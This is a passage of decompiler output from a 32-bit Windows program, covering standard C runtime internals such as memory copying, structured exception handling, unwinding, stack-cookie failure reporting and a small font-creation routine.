    v6 = a3 >> 2;
    switch ( v6 )
    {
      case 0u:
        goto LABEL_20;
      case 1u:
        goto LABEL_19;
      case 2u:
        goto LABEL_18;
      case 3u:
        goto LABEL_17;
      case 4u:
        goto LABEL_16;
      case 5u:
        goto LABEL_15;
      case 6u:
        goto LABEL_14;
      case 7u:
        *((_DWORD *)&v5[-1] + v6 - 3) = *((_DWORD *)&v3[-1] + v6 - 3);
LABEL_14:
        *((_DWORD *)&v5[-1] + v6 - 2) = *((_DWORD *)&v3[-1] + v6 - 2);
LABEL_15:
        *((_DWORD *)&v5[-1] + v6 - 1) = *((_DWORD *)&v3[-1] + v6 - 1);
LABEL_16:
        v5[-1].m128i_i32[v6] = v3[-1].m128i_i32[v6];
LABEL_17:
        v5->m128i_i32[v6 - 3] = v3->m128i_i32[v6 - 3];
LABEL_18:
        v5->m128i_i32[v6 - 2] = v3->m128i_i32[v6 - 2];
LABEL_19:
        v5->m128i_i32[v6 - 1] = v3->m128i_i32[v6 - 1];
        v3 = (const __m128i *)((char *)v3 + 4 * v6);
        v5 = (__m128i *)((char *)v5 + 4 * v6);
LABEL_20:
        switch ( a3 & 3 )
        {
          case 0u:
            goto LABEL_21;
          case 1u:
            goto LABEL_22;
          case 2u:
            goto LABEL_23;
          case 3u:
            goto LABEL_24;
        }
      default:
        qmemcpy(v5, v3, 4 * v6);
        v3 = (const __m128i *)((char *)v3 + 4 * v6);
        v5 = (__m128i *)((char *)v5 + 4 * v6);
        switch ( a3 & 3 )
        {
          case 0u:
LABEL_21:
            result = a1;
            break;
          case 1u:
LABEL_22:
            v5->m128i_i8[0] = v3->m128i_i8[0];
            result = a1;
            break;
          case 2u:
LABEL_23:
            v5->m128i_i8[0] = v3->m128i_i8[0];
            v5->m128i_i8[1] = v3->m128i_i8[1];
            result = a1;
            break;
          case 3u:
LABEL_24:
            v5->m128i_i8[0] = v3->m128i_i8[0];
            v5->m128i_i8[1] = v3->m128i_i8[1];
            v5->m128i_i8[2] = v3->m128i_i8[2];
            result = a1;
            break;
        }
        break;
    }
  }
  return result;
}
// 435874: using guessed type int dword_435874;

//----- (00412408) --------------------------------------------------------
int __cdecl _except_handler3_0(int a1, PVOID TargetFrame, int a3)
{
  int *v3; // ebp
  int *v4; // ebx
  unsigned int v5; // esi
  int v6; // edi
  int (__fastcall *v7)(_DWORD, _DWORD); // eax
  int v8; // eax
  int v9; // edi
  int v10; // ecx
  int result; // eax
  int v12[2]; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v3 = &savedregs;
  v4 = (int *)TargetFrame;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    _local_unwind2((int)TargetFrame, 0xFFFFFFFF);
    result = 1;
  }
  else
  {
    v12[0] = a1;
    v12[1] = a3;
    *((_DWORD *)TargetFrame - 1) = v12;
    v5 = *((_DWORD *)TargetFrame + 3);
    v6 = *((_DWORD *)TargetFrame + 2);
    if ( _ValidateEH3RN(TargetFrame) <= 0 )
    {
      *(_DWORD *)(a1 + 4) |= 8u;
    }
    else
    {
      while ( v5 != -1 )
      {
        v7 = *(int (__fastcall **)(_DWORD, _DWORD))(v6 + 12 * v5 + 4);
        if ( v7 )
        {
          v8 = v7(0, 0);
          v4 = (int *)v3[3];
          if ( v8 )
          {
            if ( v8 < 0 )
              return 0;
            CallDestructExceptionObject_0((_DWORD *)v3[2], 1);
            v9 = v4[2];
            _global_unwind2(v4);
            v3 = v4 + 4;
            _local_unwind2((int)v4, v5);
            sub_412845(*(_DWORD *)(v9 + 12 * v5 + 8), (int)(v4 + 4), 1);
            v4[3] = *(_DWORD *)(v9 + 4 * v10);
            v4 = 0;
            v5 = 0;
            (*(void (__fastcall **)(_DWORD, _DWORD))(v9 + 4 * v10 + 8))(0, 0);
          }
        }
        v6 = v4[2];
        v5 = *(_DWORD *)(v6 + 12 * v5);
      }
    }
    result = 1;
  }
  return result;
}
// 4124B0: variable 'v10' is possibly undefined

//----- (004125DB) --------------------------------------------------------
int sub_4125DB()
{
  dword_435874 = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 435874: using guessed type int dword_435874;

//----- (004126EE) --------------------------------------------------------
void __cdecl CallDestructExceptionObject_0(_DWORD *a1, int a2)
{
  if ( *a1 == -529697949 && dword_435870 )
  {
    if ( _IsNonwritableInCurrentImage((int)&dword_435870) )
      dword_435870(a1, a2);
  }
}
// 435870: using guessed type int (__cdecl *dword_435870)(_DWORD, _DWORD);

//----- (00412730) --------------------------------------------------------
void __cdecl __spoils<eax,ecx,edx> _global_unwind2(PVOID TargetFrame)
{
  RtlUnwind(TargetFrame, &loc_412748, 0, 0);
}

//----- (00412750) --------------------------------------------------------
int __cdecl __spoils<eax,ecx,edx> _unwind_handler(int a1, int a2, int a3, _DWORD *a4, int a5)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    _local_unwind2(*(_DWORD *)(a5 + 36), *(_DWORD *)(a5 + 40));
    *a4 = a2;
    result = 3;
  }
  return result;
}

//----- (00412795) --------------------------------------------------------
int __cdecl __spoils<eax,ecx,edx> _local_unwind2(int a1, unsigned int a2)
{
  int v2; // ebp
  int result; // eax
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // esi

  while ( 1 )
  {
    result = a1;
    v4 = *(_DWORD *)(a1 + 8);
    v5 = *(_DWORD *)(a1 + 12);
    if ( v5 == -1 || a2 != -1 && v5 <= a2 )
      break;
    v6 = 3 * v5;
    *(_DWORD *)(a1 + 12) = *(_DWORD *)(v4 + 4 * v6);
    if ( !*(_DWORD *)(v4 + 4 * v6 + 4) )
    {
      sub_412845(*(_DWORD *)(v4 + 4 * v6 + 8), v2, 257);
      sub_412864(*(int (**)(void))(v4 + 4 * v6 + 8));
    }
  }
  return result;
}
// 4127F7: variable 'v2' is possibly undefined

//----- (00412845) --------------------------------------------------------
int __userpurge sub_412845@<eax>(int result@<eax>, int a2@<ebp>, int a3)
{
  dword_435420[2] = a3;
  dword_435420[1] = result;
  dword_435420[3] = a2;
  return result;
}

//----- (00412864) --------------------------------------------------------
int __usercall sub_412864@<eax>(int (*a1)(void)@<eax>)
{
  return a1();
}

//----- (00412870) --------------------------------------------------------
int __usercall ValidateScopeTableHandlers@<eax>(int a1@<ecx>, char *a2@<edi>, int a3)
{
  _IMAGE_SECTION_HEADER *v3; // eax
  int v4; // edx
  int *v5; // ebx
  unsigned int v6; // esi
  unsigned int v7; // ecx
  int v8; // ecx
  unsigned int v9; // esi
  unsigned int v10; // ecx

  v3 = 0;
  v4 = -1;
  if ( a1 == -1 )
    return 1;
  while ( 1 )
  {
    v5 = (int *)(a3 + 12 * a1);
    v6 = (v5[2] - (_DWORD)a2) & 0xFFFFF000;
    if ( v6 != v4 )
      break;
LABEL_9:
    v8 = v5[1];
    if ( v8 )
    {
      v9 = (v8 - (_DWORD)a2) & 0xFFFFF000;
      if ( v9 != v4 )
      {
        v10 = v3->VirtualAddress;
        if ( v9 < v10 || v9 >= v10 + v3->Misc.PhysicalAddress )
        {
          v3 = _FindPESection(a2, v9);
          if ( !v3 || (v3->Characteristics & 0x20000000) == 0 )
            return 0;
        }
        v4 = v9;
      }
    }
    a1 = *v5;
    if ( *v5 == -1 )
      return 1;
  }
  if ( v3 && (v7 = v3->VirtualAddress, v6 >= v7) && v6 < v7 + v3->Misc.PhysicalAddress
    || (v3 = _FindPESection(a2, (v5[2] - (_DWORD)a2) & 0xFFFFF000)) != 0 && (v3->Characteristics & 0x20000000) != 0 )
  {
    v4 = v6;
    goto LABEL_9;
  }
  return 0;
}

//----- (00412930) --------------------------------------------------------
int __cdecl _ValidateEH3RN(_DWORD *a1)
{
  unsigned int v1; // edx
  struct _TEB *v3; // eax
  unsigned int v4; // edi
  int v5; // ebx
  unsigned int v6; // eax
  unsigned int *v7; // ecx
  unsigned int v8; // eax
  int i; // esi
  int v10; // ebx
  char *v11; // edi
  int v12; // ecx
  bool v13; // cc
  int j; // eax
  int v15; // ecx
  int v16; // edx
  char *v17; // edi
  _IMAGE_SECTION_HEADER *v18; // eax
  int v19; // edi
  int v20; // eax
  int *v21; // ecx
  int v22; // esi
  unsigned int v23; // ecx
  PVOID v24; // edx
  int *v25; // eax
  int v26; // ebx
  int v27; // esi
  void *v28; // edi
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+10h] [ebp-40h] BYREF
  int v30; // [esp+2Ch] [ebp-24h]
  unsigned int v31; // [esp+30h] [ebp-20h]
  unsigned int v32; // [esp+34h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+38h] [ebp-18h]

  v1 = a1[2];
  v32 = v1;
  if ( (v1 & 3) != 0 )
    return 0;
  v3 = NtCurrentTeb();
  v31 = (unsigned int)v3->NtTib.StackLimit;
  if ( v1 >= v31 && (PVOID)v1 < v3->NtTib.StackBase )
    return 0;
  v4 = a1[3];
  v30 = v4;
  if ( v4 != -1 )
  {
    v5 = 0;
    v6 = 0;
    v7 = (unsigned int *)v1;
    do
    {
      if ( *v7 != -1 && *v7 >= v6 )
        return 0;
      if ( v7[1] )
        v5 = 1;
      ++v6;
      v7 += 3;
    }
    while ( v6 <= v4 );
    if ( !v5 || (v8 = *(a1 - 2), v8 >= v31) && v8 < (unsigned int)a1 )
    {
      v31 = v1 & 0xFFFFF000;
      for ( i = 0; ; ++i )
      {
        if ( i >= dword_4354C0[0] )
          goto LABEL_39;
        v10 = dword_4354C8[2 * i];
        v11 = (char *)dword_4354CC[2 * i];
        if ( v10 == (v1 & 0xFFFFF000) )
          break;
      }
      ms_exc.registration.TryLevel = 0;
      if ( _ValidateImageBase(v11)
        && ValidateScopeTableHandlers(v30, v11, v32)
        && _FindPESection(v11, a1[1] - (_DWORD)v11) )
      {
        ms_exc.registration.TryLevel = -2;
        if ( i > 0 && !_InterlockedExchange(dword_4354C4, 1) )
        {
          if ( dword_4354C8[2 * i] != v31 )
          {
            v12 = dword_4354C0[0];
            i = dword_4354C0[0] - 1;
            if ( dword_4354C0[0] - 1 >= 0 )
            {
              while ( dword_4354C8[2 * i] != v31 )
              {
                if ( --i < 0 )
                  goto LABEL_29;
              }
              v10 = dword_4354C8[2 * i];
              v11 = (char *)dword_4354CC[2 * i];
LABEL_29:
              v13 = i <= 0;
              if ( i >= 0 )
                goto LABEL_34;
            }
            if ( dword_4354C0[0] < 16 )
              v12 = ++dword_4354C0[0];
            i = v12 - 1;
          }
          v13 = i <= 0;
LABEL_34:
          if ( !v13 )
          {
            for ( j = 0; j <= i; ++j )
            {
              v15 = dword_4354C8[2 * j];
              v16 = dword_4354CC[2 * j];
              dword_4354C8[2 * j] = v10;
              dword_4354CC[2 * j] = (int)v11;
              v10 = v15;
              v11 = (char *)v16;
            }
          }
LABEL_64:
          _InterlockedExchange(dword_4354C4, 0);
          return 1;
        }
        return 1;
      }
      ms_exc.registration.TryLevel = -2;
      v1 = v32;
LABEL_39:
      if ( !VirtualQuery((LPCVOID)v1, &Buffer, 0x1Cu) )
        return 1;
      if ( Buffer.Type != 0x1000000 )
        return -1;
      v17 = (char *)Buffer.AllocationBase;
      if ( !_ValidateImageBase((char *)Buffer.AllocationBase) )
        return -1;
      if ( ((Buffer.Protect & 0xCC) == 0
         || (v18 = _FindPESection(v17, v32 - (_DWORD)v17)) != 0 && (v18->Characteristics & 0x80000000) == 0)
        && ValidateScopeTableHandlers(v30, v17, v32)
        && _FindPESection(v17, a1[1] - (_DWORD)v17) )
      {
        if ( _InterlockedExchange(dword_4354C4, 1) )
          return 1;
        v19 = dword_4354C0[0];
        v20 = dword_4354C0[0];
        if ( dword_4354C0[0] > 0 )
        {
          v21 = &dword_4354C0[2 * dword_4354C0[0]];
          do
          {
            if ( *v21 == v31 )
              break;
            --v20;
            v21 -= 2;
          }
          while ( v20 > 0 );
        }
        if ( v20 )
        {
          dword_4354C4[2 * v20] = (int)Buffer.AllocationBase;
        }
        else
        {
          v22 = 15;
          if ( dword_4354C0[0] <= 15 )
            v22 = dword_4354C0[0];
          v23 = v31;
          v24 = Buffer.AllocationBase;
          if ( v22 >= 0 )
          {
            v25 = dword_4354C8;
            v26 = v22 + 1;
            do
            {
              v27 = *v25;
              v28 = (void *)v25[1];
              *v25 = v23;
              v25[1] = (int)v24;
              v23 = v27;
              v24 = v28;
              v25 += 2;
              --v26;
            }
            while ( v26 );
            v19 = dword_4354C0[0];
          }
          if ( v19 < 16 )
            dword_4354C0[0] = v19 + 1;
        }
        goto LABEL_64;
      }
    }
    return 0;
  }
  return 1;
}
// 4354C0: using guessed type int dword_4354C0[];
// 4354C4: using guessed type int dword_4354C4[];
// 4354C8: using guessed type int dword_4354C8[];

//----- (00412C80) --------------------------------------------------------
BOOL __cdecl _ValidateImageBase(char *pImageBase)
{
  BOOL result; // eax
  char *v2; // eax

  if ( *(_WORD *)pImageBase == 23117 && (v2 = &pImageBase[*((_DWORD *)pImageBase + 15)], *(_DWORD *)v2 == 17744) )
    result = *((_WORD *)v2 + 12) == 267;
  else
    result = 0;
  return result;
}

//----- (00412CC0) --------------------------------------------------------
_IMAGE_SECTION_HEADER *__cdecl _FindPESection(char *pImageBase, unsigned int rva)
{
  char *v2; // ecx
  unsigned int v3; // esi
  unsigned int v4; // edx
  _IMAGE_SECTION_HEADER *result; // eax
  unsigned int v6; // ecx

  v2 = &pImageBase[*((_DWORD *)pImageBase + 15)];
  v3 = *((unsigned __int16 *)v2 + 3);
  v4 = 0;
  result = (_IMAGE_SECTION_HEADER *)&v2[*((unsigned __int16 *)v2 + 10) + 24];
  if ( !*((_WORD *)v2 + 3) )
    return 0;
  while ( 1 )
  {
    v6 = result->VirtualAddress;
    if ( rva >= v6 && rva < v6 + result->Misc.PhysicalAddress )
      break;
    ++v4;
    ++result;
    if ( v4 >= v3 )
      return 0;
  }
  return result;
}

//----- (00412D10) --------------------------------------------------------
BOOL __cdecl _IsNonwritableInCurrentImage(int a1)
{
  _IMAGE_SECTION_HEADER *v1; // eax
  BOOL result; // eax

  if ( _ValidateImageBase((char *)0x400000) && (v1 = _FindPESection((char *)0x400000, a1 - 0x400000)) != 0 )
    result = (v1->Characteristics & 0x80000000) == 0;
  else
    result = 0;
  return result;
}

//----- (00412DE0) --------------------------------------------------------
int __cdecl _except_handler4(_EXCEPTION_RECORD *ExceptionRecord, _EXCEPTION_REGISTRATION_RECORD *EstablisherFrame, _CONTEXT *ContextRecord)
{
  _EXCEPTION_REGISTRATION_RECORD *v3; // ebx
  uintptr_t v4; // esi
  _EXCEPTION_REGISTRATION_RECORD *v5; // edi
  int (*v6)(void); // ecx
  int v7; // eax
  int v8; // eax
  _EXCEPTION_REGISTRATION_RECORD *v10; // eax
  int v11[2]; // [esp+Ch] [ebp-18h] BYREF
  uintptr_t v12; // [esp+14h] [ebp-10h]
  int v13; // [esp+18h] [ebp-Ch]
  EXCEPTION_ROUTINE *v14; // [esp+1Ch] [ebp-8h]
  char v15; // [esp+23h] [ebp-1h]

  v3 = EstablisherFrame;
  v4 = __security_cookie ^ (uintptr_t)EstablisherFrame[1].Next;
  v15 = 0;
  v13 = 1;
  v5 = EstablisherFrame + 2;
  if ( (ExceptionRecord->ExceptionFlags & 0x66) != 0 )
    goto LABEL_17;
  EstablisherFrame[-1].Handler = (PEXCEPTION_ROUTINE)v11;
  v3 = (_EXCEPTION_REGISTRATION_RECORD *)EstablisherFrame[1].Handler;
  v11[0] = (int)ExceptionRecord;
  v11[1] = (int)ContextRecord;
  if ( v3 != (_EXCEPTION_REGISTRATION_RECORD *)-2 )
  {
    do
    {
      v6 = *(int (**)(void))(v4 + 12 * (_DWORD)v3 + 20);
      v12 = v4 + 12 * (_DWORD)v3 + 16;
      v7 = *(_DWORD *)v12;
      v14 = *(EXCEPTION_ROUTINE **)v12;
      if ( v6 )
      {
        v8 = sub_413172(v6);
        v15 = 1;
        if ( v8 < 0 )
          return 0;
        if ( v8 > 0 )
        {
          if ( ExceptionRecord->ExceptionCode == -529697949
            && dword_435870
            && _IsNonwritableInCurrentImage((int)&dword_435870) )
          {
            dword_435870(ExceptionRecord, 1);
          }
          sub_4131A2(EstablisherFrame, ExceptionRecord);
          v10 = EstablisherFrame;
          if ( (_EXCEPTION_REGISTRATION_RECORD *)EstablisherFrame[1].Handler != v3 )
          {
            sub_4131BB((int)EstablisherFrame, (unsigned int)v3, (int)v5, &__security_cookie);
            v10 = EstablisherFrame;
          }
          v10[1].Handler = v14;
          sub_413189(*(int (__fastcall **)(_DWORD, _DWORD))(v12 + 8), (int)v5);
LABEL_17:
          if ( v3[1].Handler != (PEXCEPTION_ROUTINE)-2 )
            sub_4131BB((int)v3, 0xFFFFFFFE, (int)v5, &__security_cookie);
          return v13;
        }
        v7 = (int)v14;
      }
      v3 = (_EXCEPTION_REGISTRATION_RECORD *)v7;
    }
    while ( v7 != -2 );
  }
  return v13;
}
// 435870: using guessed type int (__cdecl *dword_435870)(_DWORD, _DWORD);

//----- (00412F6F) --------------------------------------------------------
void __cdecl __noreturn __report_gsfailure_0()
{
  int v0; // eax
  int v1; // edx
  int v2; // ecx
  int v3; // ebx
  int v4; // edi
  int v5; // esi
  unsigned int v6; // kr00_4
  HANDLE v7; // eax
  int vars0; // [esp+328h] [ebp+0h]
  int retaddr; // [esp+32Ch] [ebp+4h]
  char v10; // [esp+330h] [ebp+8h] BYREF

  dword_435650 = v0;
  dword_43564C = v2;
  dword_435648 = v1;
  dword_435644 = v3;
  dword_435640 = v5;
  dword_43563C = v4;
  word_435668 = __SS__;
  word_43565C = __CS__;
  word_435638 = __DS__;
  word_435634 = __ES__;
  word_435630 = __FS__;
  word_43562C = __GS__;
  v6 = __readeflags();
  dword_435660 = v6;
  dword_435654 = vars0;
  dword_435658 = retaddr;
  dword_435664 = (int)&v10;
  dword_4355A0 = 65537;
  dword_435554 = retaddr;
  dword_435548 = -1073740791;
  dword_43554C = 1;
  dword_435598 = IsDebuggerPresent();
  sub_4131D2();
  SetUnhandledExceptionFilter(0);
  UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo);
  if ( !dword_435598 )
    sub_4131D2();
  v7 = GetCurrentProcess();
  TerminateProcess(v7, 0xC0000409);
}
// 412F7A: variable 'v0' is possibly undefined
// 412F7F: variable 'v2' is possibly undefined
// 412F85: variable 'v1' is possibly undefined
// 412F8B: variable 'v3' is possibly undefined
// 412F91: variable 'v5' is possibly undefined
// 412F97: variable 'v4' is possibly undefined
// 412FD1: variable 'vars0' is possibly undefined
// 435548: using guessed type int dword_435548;
// 43554C: using guessed type int dword_43554C;
// 435554: using guessed type int dword_435554;
// 435598: using guessed type int dword_435598;
// 4355A0: using guessed type int dword_4355A0;
// 43562C: using guessed type __int16 word_43562C;
// 435630: using guessed type __int16 word_435630;
// 435634: using guessed type __int16 word_435634;
// 435638: using guessed type __int16 word_435638;
// 43563C: using guessed type int dword_43563C;
// 435640: using guessed type int dword_435640;
// 435644: using guessed type int dword_435644;
// 435648: using guessed type int dword_435648;
// 43564C: using guessed type int dword_43564C;
// 435650: using guessed type int dword_435650;
// 435654: using guessed type int dword_435654;
// 435658: using guessed type int dword_435658;
// 43565C: using guessed type __int16 word_43565C;
// 435660: using guessed type int dword_435660;
// 435664: using guessed type int dword_435664;
// 435668: using guessed type __int16 word_435668;

//----- (00413080) --------------------------------------------------------
// 3
int __usercall _local_unwind4_0@<eax>(int a1@<ebp>, _DWORD *a2, int a3, unsigned int a4)
{
  int result; // eax
  unsigned int v5; // esi
  int v6; // esi
  int v7; // ebx

  while ( 1 )
  {
    result = a3;
    v5 = *(_DWORD *)(a3 + 12);
    if ( v5 == -2 || a4 != -2 && v5 <= a4 )
      break;
    v6 = 3 * v5;
    v7 = (*a2 ^ *(_DWORD *)(a3 + 8)) + 4 * v6 + 16;
    *(_DWORD *)(a3 + 12) = *(_DWORD *)((*a2 ^ *(_DWORD *)(a3 + 8)) + 4 * v6 + 0x10);
    if ( !*(_DWORD *)(v7 + 4) )
    {
      sub_412845(*(_DWORD *)(v7 + 8), a1, 257);
      sub_412864(*(int (**)(void))(v7 + 8));
    }
  }
  return result;
}

//----- (00413110) --------------------------------------------------------
int __cdecl _unwind_handler4(int a1, _DWORD *a2, int a3, _DWORD *a4)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    _local_unwind4_0(a2[6], (_DWORD *)a2[5], a2[4], a2[3]);
    *a4 = a2;
    result = 3;
  }
  return result;
}

//----- (00413172) --------------------------------------------------------
int __thiscall sub_413172(int (*this)(void))
{
  return this();
}

//----- (00413189) --------------------------------------------------------
int __fastcall sub_413189(int (__fastcall *a1)(_DWORD, _DWORD), int a2)
{
  sub_412845((int)a1, a2, 1);
  return a1(0, 0);
}

//----- (004131A2) --------------------------------------------------------
void __fastcall sub_4131A2(PVOID TargetFrame, PEXCEPTION_RECORD ExceptionRecord)
{
  RtlUnwind(TargetFrame, &loc_4131B6, ExceptionRecord, 0);
}

//----- (004131BB) --------------------------------------------------------
int __fastcall sub_4131BB(int a1, unsigned int a2, int a3, _DWORD *a4)
{
  return _local_unwind4_0(a3, a4, a1, a2);
}

//----- (004131D2) --------------------------------------------------------
void sub_4131D2()
{
  dword_43586C = 0;
}
// 43586C: using guessed type int dword_43586C;

//----- (004131E0) --------------------------------------------------------
HFONT sub_4131E0()
{
  HFONT result; // eax

  result = CreateFontA(15, 0, 0, 0, 0, 0, 0, 0, 0, 4u, 0x20u, 0, 0, "Arial");
  wParam = (WPARAM)result;
  return result;
}

// nfuncs=48 queued=46 decompiled=46 lumina nreq=0 worse=0 better=0
// ALL OK, 46 function(s) have been successfully decompiled
